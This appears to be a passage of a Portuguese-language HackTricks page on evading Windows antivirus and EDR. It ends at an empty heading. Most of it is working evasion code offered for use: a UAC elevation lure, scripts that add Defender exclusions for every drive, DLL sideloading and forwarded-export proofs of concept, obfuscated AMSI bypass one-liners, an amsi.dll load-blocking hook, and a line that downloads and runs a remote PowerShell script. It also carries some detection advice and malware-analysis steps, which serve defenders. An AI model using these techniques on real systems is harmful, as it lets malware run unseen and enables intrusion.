# Bypass de antivírus (AV)

{{#include ../banners/hacktricks-training.md}}

**Esta página foi escrita originalmente por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uma ferramenta para impedir o funcionamento do Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uma ferramenta para impedir o funcionamento do Windows Defender, fingindo ser outro antivírus.
- [Desativar o Defender se você for administrador](basic-powershell-for-pentesters/README.md)

### Isca de UAC no estilo de instalador antes de adulterar o Defender

Loaders públicos disfarçados de cheats para jogos frequentemente vêm como instaladores unsigned de Node.js/Nexe que primeiro **pedem ao usuário para elevar os privilégios** e só então neutralizam o Defender. O fluxo é simples:

1. Verificar se há contexto administrativo usando `net session`. O comando só é bem-sucedido quando o usuário tem direitos de administrador; portanto, uma falha indica que o loader está sendo executado como usuário padrão.
2. Imediatamente, iniciar novamente o próprio processo com o verbo `RunAs` para exibir o prompt de consentimento do UAC esperado, preservando a linha de comando original.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

As vítimas já acreditam que estão instalando software “cracked”, então geralmente aceitam o prompt, dando ao malware as permissões necessárias para alterar a política do Defender.<sup>[[26]](#references)</sup>

### Exclusões abrangentes de `MpPreference` para cada letra de unidade

Depois de obter privilégios elevados, cadeias no estilo GachiLoader ampliam ao máximo os pontos cegos do Defender, em vez de desativar o serviço por completo. Primeiro, o loader encerra o watchdog da GUI (`taskkill /F /IM SecHealthUI.exe`) e, em seguida, adiciona **exclusões extremamente abrangentes**, tornando impossível a verificação de todos os perfis de usuário, diretórios do sistema e discos removíveis:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Observações principais:

- O loop percorre todos os sistemas de arquivos montados (D:\, E:\, pendrives USB etc.), então **qualquer payload futuro colocado em qualquer lugar do disco será ignorado**.
- A exclusão da extensão `.sys` é preventiva — os atacantes reservam a opção de carregar drivers não assinados mais tarde sem precisar mexer novamente no Defender.
- Todas as alterações ficam em `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permitindo que etapas posteriores confirmem que as exclusões persistem ou as expandam sem acionar novamente o UAC.

Como nenhum serviço do Defender é interrompido, verificações de integridade ingênuas continuam informando que o “antivírus está ativo”, embora a inspeção em tempo real nunca examine esses caminhos.<sup>[[26]](#references)</sup>

## **Metodologia de evasão de AV**

Atualmente, os AVs usam métodos diferentes para verificar se um arquivo é malicioso ou não: detecção estática, análise dinâmica e, nos EDRs mais avançados, análise comportamental.

### **Detecção estática**

A detecção estática é feita sinalizando strings maliciosas conhecidas ou sequências de bytes em um binário ou script, além de extrair informações do próprio arquivo (por exemplo, descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum etc.). Isso significa que o uso de ferramentas públicas conhecidas pode fazer com que você seja detectado mais facilmente, pois elas provavelmente já foram analisadas e sinalizadas como maliciosas. Há algumas maneiras de contornar esse tipo de detecção:

- **Criptografia**

Se você criptografar o binário, o AV não terá como detectar seu programa, mas você precisará de algum tipo de loader para descriptografar e executar o programa na memória.

- **Obfuscação**

Às vezes, basta alterar algumas strings no binário ou script para fazê-lo passar pelo AV, mas isso pode ser uma tarefa demorada, dependendo do que você está tentando obfuscar.

- **Ferramentas personalizadas**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas maliciosas conhecidas, mas isso exige muito tempo e esforço.

> [!TIP]
> Uma boa forma de verificar a detecção estática do Windows Defender é usar [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Basicamente, ele divide o arquivo em vários segmentos e pede ao Defender que examine cada um individualmente. Assim, ele pode indicar exatamente quais strings ou bytes do seu binário foram sinalizados.

Recomendo muito conferir esta [playlist do YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre evasão prática de AV.

### **Análise dinâmica**

A análise dinâmica ocorre quando o AV executa seu binário em um sandbox e monitora atividades maliciosas (por exemplo, tentar descriptografar e ler as senhas do navegador, fazer um minidump do LSASS etc.). Essa parte pode ser um pouco mais complicada, mas aqui estão algumas coisas que você pode fazer para evadir sandboxes.

- **Aguardar antes da execução** Dependendo de como isso é implementado, pode ser uma ótima forma de contornar a análise dinâmica do AV. Os AVs têm pouquíssimo tempo para examinar arquivos sem interromper o fluxo de trabalho do usuário, então longas esperas podem atrapalhar a análise dos binários. O problema é que muitos sandboxes de AV podem simplesmente ignorar a espera, dependendo de como ela é implementada.
- **Verificar os recursos da máquina** Normalmente, sandboxes têm poucos recursos disponíveis (por exemplo, < 2 GB de RAM), caso contrário, poderiam deixar a máquina do usuário mais lenta. Você também pode ser bastante criativo aqui, por exemplo, verificando a temperatura da CPU ou até a velocidade das ventoinhas; nem tudo será implementado no sandbox.
- **Verificações específicas da máquina** Se você quiser atingir um usuário cuja estação de trabalho esteja ingressada no domínio "contoso.local", pode verificar o domínio do computador para ver se corresponde ao que você especificou. Se não corresponder, você pode fazer o programa sair.

Descobriu-se que o nome do computador do Sandbox do Microsoft Defender é HAL9TH. Portanto, você pode verificar o nome do computador no seu malware antes da detonação: se o nome for HAL9TH, significa que você está dentro do sandbox do Defender, então pode fazer o programa sair.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Outras ótimas dicas de [@mgeeky](https://twitter.com/mariuszbit) para lidar com sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como dissemos antes nesta publicação, **ferramentas públicas** acabarão sendo **detectadas**, então você deve se perguntar:

Por exemplo, se você quiser despejar o LSASS, **precisa mesmo usar o mimikatz**? Ou poderia usar outro projeto menos conhecido que também despeje o LSASS?

Provavelmente, a resposta certa é a segunda opção. Tomando o mimikatz como exemplo, ele provavelmente é uma das amostras de malware mais sinalizadas pelos AVs e EDRs, se não a mais sinalizada. Embora o projeto em si seja muito interessante, também é um pesadelo contornar os AVs usando-o. Portanto, procure alternativas para o que você está tentando fazer.

> [!TIP]
> Ao modificar seus payloads para evasão, certifique-se de **desativar o envio automático de amostras** no Defender e, por favor, **NÃO ENVIE PARA O VIRUSTOTAL** se seu objetivo for manter a evasão a longo prazo. Se quiser verificar se um AV específico detecta seu payload, instale-o em uma VM, tente desativar o envio automático de amostras e faça os testes ali até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, **priorize o uso de DLLs para evasão**. Na minha experiência, arquivos DLL costumam ser **bem menos detectados** e analisados, então esse é um truque muito simples para evitar a detecção em alguns casos (se o seu payload puder ser executado como DLL, é claro).

Como podemos ver nesta imagem, um payload DLL do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem uma taxa de detecção de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparação no antiscan.me entre um payload EXE normal do Havoc e uma DLL normal do Havoc</p></figcaption></figure>

Agora vamos mostrar alguns truques que você pode usar com arquivos DLL para ficar muito mais furtivo.

## DLL Sideloading & Proxying

**DLL Sideloading** aproveita a ordem de pesquisa de DLL usada pelo loader, colocando o aplicativo vítima e o(s) payload(s) malicioso(s) lado a lado.

Você pode verificar quais programas são suscetíveis a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte script de PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Este comando exibirá a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Recomendo fortemente que você **explore programas suscetíveis a DLL Hijacking/Sideloading por conta própria**. Essa técnica é bastante furtiva quando executada corretamente, mas, se você usar programas publicamente conhecidos que permitem DLL Sideloading, poderá ser detectado facilmente.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não fará com que seu payload seja carregado, pois o programa espera encontrar funções específicas dentro dessa DLL. Para resolver esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas feitas por um programa da DLL proxy (e maliciosa) para a DLL original, preservando assim a funcionalidade do programa e permitindo executar seu payload.

Vou usar o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estas são as etapas que segui:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

O último comando nos fornecerá 2 arquivos: um modelo de código-fonte de DLL e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Estes são os resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto a proxy DLL têm uma taxa de detecção de 0/26 no [antiscan.me](https://antiscan.me)! Eu diria que foi um sucesso.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Recomendo muito** que você assista ao [VOD de S3cur3Th1sSh1t na Twitch](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também ao [vídeo do ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para saber mais sobre o que discutimos em mais detalhes.

### Abusando de Exports Encaminhados (ForwardSideLoading)

Módulos PE do Windows podem exportar funções que, na verdade, são "forwarders": em vez de apontar para código, a entrada de export contém uma string ASCII no formato `TargetDll.TargetFunc`. Quando um chamador resolve o export, o loader do Windows:

- Carrega `TargetDll`, caso ainda não esteja carregada
- Resolve `TargetFunc` a partir dela

Comportamentos importantes a entender:
- Se `TargetDll` for uma KnownDLL, ela é fornecida pelo namespace protegido KnownDLLs (por exemplo, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` não for uma KnownDLL, a ordem normal de busca de DLLs será usada, incluindo o diretório do módulo que está realizando a resolução do forward.

Isso possibilita uma primitiva indireta de sideloading: encontrar uma DLL assinada que exporte uma função encaminhada para um módulo que não seja KnownDLL, e então colocar essa DLL assinada no mesmo diretório que uma DLL controlada pelo atacante, nomeada exatamente como o módulo de destino encaminhado. Quando o export encaminhado é invocado, o loader resolve o forward e carrega sua DLL do mesmo diretório, executando seu DllMain.<sup>[[13]](#references)</sup>

Exemplo observado no Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` não é uma KnownDLL, então é localizado pela ordem de pesquisa normal.

PoC (copiar e colar):
1) Copie a DLL de sistema assinada para uma pasta com permissão de gravação
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloque uma `NCRYPTPROV.dll` maliciosa na mesma pasta. Um `DllMain` mínimo basta para executar código; não é necessário implementar a função encaminhada para acionar o `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Acione o forward com um LOLBin assinado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- While resolving `KeyIsoSetAuditingInterface`, the loader follows the forward to `NCRYPTPROV.SetAuditingInterface`
- The loader then loads `NCRYPTPROV.dll` from `C:\test` and executes its `DllMain`
- If `SetAuditingInterface` is not implemented, you'll get a "missing API" error only after `DllMain` has already run

Hunting tips:
- Focus on forwarded exports where the target module is not a KnownDLL. KnownDLLs are listed under `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- You can enumerate forwarded exports with tooling such as:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulte o inventário de forwarders do Windows 11 para buscar candidatos: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideias de detecção/defesa:
- Monitore LOLBins (por exemplo, rundll32.exe) carregando DLLs assinadas de caminhos não relacionados ao sistema, seguidas pelo carregamento de DLLs que não são KnownDLLs com o mesmo nome base desse diretório
- Gere alertas para cadeias de processos/módulos como: `rundll32.exe` → `keyiso.dll` não relacionada ao sistema → `NCRYPTPROV.dll` em caminhos graváveis pelo usuário
- Aplique políticas de integridade de código (WDAC/AppLocker) e negue permissões de gravação e execução nos diretórios de aplicativos

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Você pode usar Freeze para carregar e executar seu shellcode de forma furtiva.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion é apenas um jogo de gato e rato: o que funciona hoje pode ser detectado amanhã. Portanto, nunca confie em apenas uma ferramenta; se possível, tente encadear várias técnicas de evasion.

## Syscalls diretas/indiretas e resolução de SSN (SysWhispers4)

Os EDRs costumam colocar **inline hooks em user-mode** nos stubs de syscall do `ntdll.dll`. Para contornar esses hooks, você pode gerar stubs de syscall **diretos** ou **indiretos** que carregam o **SSN** (System Service Number) correto e fazem a transição para o kernel mode sem executar o entrypoint exportado com hook.<sup>[[32]](#references)</sup>

**Opções de invocação:**
- **Direta (incorporada)**: emite uma instrução `syscall`/`sysenter`/`SVC #0` no stub gerado (não acessa uma exportação de `ntdll`).
- **Indireta**: salta para um gadget `syscall` existente dentro de `ntdll`, fazendo com que a transição para o kernel pareça originar-se de `ntdll` (útil para evasion heurística); **indireta aleatória** escolhe um gadget de um conjunto a cada chamada.
- **Egg-hunt**: evita incorporar a sequência estática de opcode `0F 05` em disco; resolve uma sequência de syscall durante a execução.

**Estratégias de resolução de SSN resistentes a hooks:**
- **FreshyCalls (ordenação por VA)**: infere SSNs ordenando os stubs de syscall por endereço virtual, em vez de ler os bytes dos stubs.
- **SyscallsFromDisk**: mapeia um `\KnownDlls\ntdll.dll` limpo, lê os SSNs de sua seção `.text` e, em seguida, remove o mapeamento (contorna todos os hooks em memória).
- **RecycledGate**: combina a inferência de SSN por ordenação de VA com a validação de opcode quando um stub está limpo; recorre à inferência por VA se houver um hook.
- **HW Breakpoint**: define DR0 na instrução `syscall` e usa um VEH para capturar o SSN de `EAX` durante a execução, sem analisar bytes com hooks.

Exemplo de uso do SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

O AMSI foi criado para prevenir "[malware sem arquivo](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os AVs só eram capazes de escanear **arquivos no disco**, então, se você conseguisse executar payloads **diretamente in-memory**, o AV não poderia fazer nada para impedir isso, pois não tinha visibilidade suficiente.

O recurso AMSI está integrado a estes componentes do Windows.

- Controle de Conta de Usuário, ou UAC (elevação de EXE, COM, MSI ou instalação do ActiveX)
- PowerShell (scripts, uso interativo e avaliação dinâmica de código)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macros VBA do Office

Ele permite que soluções antivírus inspecionem o comportamento dos scripts, expondo o conteúdo dos scripts de forma não criptografada e não ofuscada.

A execução de `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produzirá o seguinte alerta no Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observe como ele adiciona o prefixo `amsi:` e, em seguida, o caminho para o executável a partir do qual o script foi executado; neste caso, powershell.exe.

Não gravamos nenhum arquivo no disco, mas ainda assim fomos detectados in-memory por causa do AMSI.

Além disso, a partir do **.NET 4.8**, o código C# também passa pelo AMSI. Isso afeta até mesmo `Assembly.Load(byte[])`, usado para carregar código in-memory. Por isso, recomenda-se usar versões inferiores do .NET (como 4.7.2 ou anteriores) para execução in-memory, caso queira evitar o AMSI.

Há algumas maneiras de contornar o AMSI:

- **Obfuscation**

Como o AMSI funciona principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa maneira de evitar a detecção.

No entanto, o AMSI é capaz de desofuscar scripts mesmo quando eles têm várias camadas, então a obfuscation pode ser uma má opção, dependendo de como é feita. Isso torna a evasão nada simples. Ainda assim, às vezes, basta alterar alguns nomes de variáveis para resolver o problema; portanto, depende do quanto algo foi sinalizado.

- **AMSI Bypass**

Como o AMSI é implementado carregando uma DLL no processo do PowerShell (e também nos processos cscript.exe, wscript.exe etc.), é fácil adulterá-lo, mesmo executando como usuário sem privilégios. Devido a essa falha na implementação do AMSI, pesquisadores encontraram várias maneiras de evitar a verificação do AMSI.

**Forçando um erro**

Forçar a falha da inicialização do AMSI (amsiInitFailed) fará com que nenhuma verificação seja iniciada para o processo atual. Isso foi divulgado originalmente por [Matt Graeber](https://twitter.com/mattifestation), e a Microsoft desenvolveu uma assinatura para impedir o uso mais amplo desse método.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Bastou uma linha de código PowerShell para tornar o AMSI inutilizável no processo PowerShell atual. Essa linha, é claro, foi sinalizada pelo próprio AMSI, então é necessário modificá-la para usar essa técnica.

Aqui está um bypass do AMSI modificado que retirei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Tenha em mente que isso provavelmente será sinalizado assim que esta publicação for lançada; portanto, você não deve publicar nenhum código se seu plano for permanecer indetectado.

**Memory Patching**

Esta técnica foi descoberta inicialmente por [@RastaMouse](https://twitter.com/_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por verificar as entradas fornecidas pelo usuário) e sobrescrevê-la com instruções para retornar o código de E_INVALIDARG. Dessa forma, o resultado da verificação real será 0, que é interpretado como um resultado limpo.

> [!TIP]
> Leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para obter uma explicação mais detalhada.

Há também muitas outras técnicas usadas para contornar o AMSI com powershell. Confira [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**este repositório**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para saber mais sobre elas.

### Bloqueando o AMSI ao impedir o carregamento de amsi.dll (hook de LdrLoadDll)

O AMSI é inicializado somente após o carregamento de `amsi.dll` no processo atual. Um bypass robusto e independente de linguagem consiste em instalar um hook em modo usuário em `ntdll!LdrLoadDll` que retorna um erro quando o módulo solicitado é `amsi.dll`. Como resultado, o AMSI nunca é carregado e nenhuma verificação ocorre nesse processo.<sup>[[23]](#references)</sup>

Esboço da implementação (pseudocódigo C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona com PowerShell, WScript/CScript e loaders personalizados (qualquer coisa que, de outra forma, carregaria o AMSI).
- Combine com o envio de scripts por stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefatos longos na linha de comando.
- Já foi usado por loaders executados por meio de LOLBins (por exemplo, `regsvr32` chamando `DllRegisterServer`).

A ferramenta **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** também gera scripts para contornar o AMSI.
A ferramenta **[https://amsibypass.com/](https://amsibypass.com/)** também gera scripts para contornar o AMSI e evitar a detecção por assinatura usando funções definidas pelo usuário aleatorizadas, variáveis e expressões de caracteres, além de aplicar aleatoriamente maiúsculas e minúsculas às palavras-chave do PowerShell.

**Remover a assinatura detectada**

Você pode usar ferramentas como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover da memória do processo atual a assinatura detectada pelo AMSI. Essas ferramentas funcionam varrendo a memória do processo atual em busca da assinatura do AMSI e, em seguida, sobrescrevendo-a com instruções NOP, removendo-a efetivamente da memória.

**Produtos AV/EDR que usam AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usar a versão 2 do PowerShell**
Se você usar a versão 2 do PowerShell, o AMSI não será carregado, então você poderá executar seus scripts sem que sejam verificados pelo AMSI. Você pode fazer isso:

```bash
powershell.exe -version 2
```

## Registro do PowerShell

O registro do PowerShell é um recurso que permite registrar todos os comandos do PowerShell executados em um sistema. Isso pode ser útil para fins de auditoria e solução de problemas, mas também pode ser um **problema para atacantes que querem evitar a detecção**.

Para contornar o registro do PowerShell, você pode usar as seguintes técnicas:

- **Desabilitar a Transcrição do PowerShell e o Registro de Módulos**: Você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para esse fim.
- **Usar a versão 2 do PowerShell**: Se você usar o PowerShell versão 2, o AMSI não será carregado, então poderá executar seus scripts sem que sejam verificados pelo AMSI. Você pode fazer isso: `powershell.exe -version 2`
- **Usar uma sessão não gerenciada do PowerShell**: Use [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para hospedar o PowerShell sem iniciar `powershell.exe` (a abordagem usada pelo `powerpick` do Cobalt Strike). Isso contorna os controles vinculados especificamente ao processo `powershell.exe`, mas não desabilita por si só o AMSI, o Script Block Logging nem todas as outras defesas do PowerShell; a cobertura depende do runtime e da implementação do host.


## Ofuscação

> [!TIP]
> Várias técnicas de ofuscação dependem da criptografia de dados, o que aumenta a entropia do binário e facilita sua detecção por AVs e EDRs. Tenha cuidado com isso e talvez aplique criptografia apenas a seções específicas do código que sejam sensíveis ou precisem ser ocultadas.

### Desofuscar binários .NET protegidos pelo ConfuserEx

Ao analisar malware que usa o ConfuserEx 2 (ou forks comerciais), é comum encontrar várias camadas de proteção que impedem o funcionamento de decompiladores e sandboxes. O fluxo de trabalho abaixo **restaura de forma confiável um IL quase original**, que pode depois ser decompilado para C# em ferramentas como dnSpy ou ILSpy.<sup>[[10]](#references)</sup>

1. Remoção da proteção contra adulteração – O ConfuserEx criptografa cada *corpo de método* e o descriptografa dentro do construtor estático do *módulo* (`<Module>.cctor`). Isso também corrige o checksum do PE, então qualquer modificação fará o binário falhar. Use **AntiTamperKiller** para localizar as tabelas de metadados criptografadas, recuperar as chaves XOR e reescrever um assembly limpo:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   A saída contém os 6 parâmetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que podem ser úteis ao criar seu próprio unpacker.

2.  Recuperação de símbolos / fluxo de controle – forneça o arquivo *limpo* ao **de4dot-cex** (um fork do de4dot compatível com ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Sinalizadores:
     • `-p crx` – seleciona o perfil ConfuserEx 2
     • de4dot desfaz o achatamento do fluxo de controle, restaura os namespaces, as classes e os nomes das variáveis originais e descriptografa as strings constantes.

3.  Remoção de proxy calls – ConfuserEx substitui chamadas diretas a métodos por wrappers leves (também chamados de *proxy calls*) para dificultar ainda mais a descompilação.  Remova-os com **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Após esta etapa, você deverá observar APIs .NET normais, como `Convert.FromBase64String` ou `AES.Create()`, em vez de funções wrapper opacas (`Class8.smethod_10`, …).

4.  Limpeza manual – execute o binário resultante no dnSpy e procure grandes blobs Base64 ou o uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar o payload *real*. Muitas vezes, o malware o armazena como um array de bytes codificado em TLV, inicializado dentro de `<Module>.byte_0`.

A cadeia acima restaura o fluxo de execução **sem** precisar executar a amostra maliciosa – algo útil ao trabalhar em uma estação de trabalho offline.

> 🛈  O ConfuserEx produz um atributo personalizado chamado `ConfusedByAttribute`, que pode ser usado como IOC para fazer a triagem automática de amostras.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: ofuscador C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork de código aberto da suíte de compilação [LLVM](http://www.llvm.org/) capaz de aumentar a segurança do software por meio de [ofuscação de código](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e proteção contra adulteração.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar código ofuscado em tempo de compilação, sem usar ferramentas externas e sem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de operações ofuscadas, geradas pelo framework de metaprogramação de templates do C++, que dificultará um pouco o trabalho de quem tentar crackear o aplicativo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um ofuscador de binários x64 capaz de ofuscar diversos arquivos PE, incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um mecanismo simples de código metamórfico para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de ofuscação de código granular para linguagens compatíveis com LLVM que usa ROP (programação orientada a retorno). O ROPfuscator ofusca um programa no nível do código assembly, transformando instruções comuns em cadeias ROP e frustrando nossa concepção natural do fluxo de controle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um crypter de PE .NET escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e, em seguida, carregá-los

### Mascaramento próprio por função assistido pelo compilador LLVM

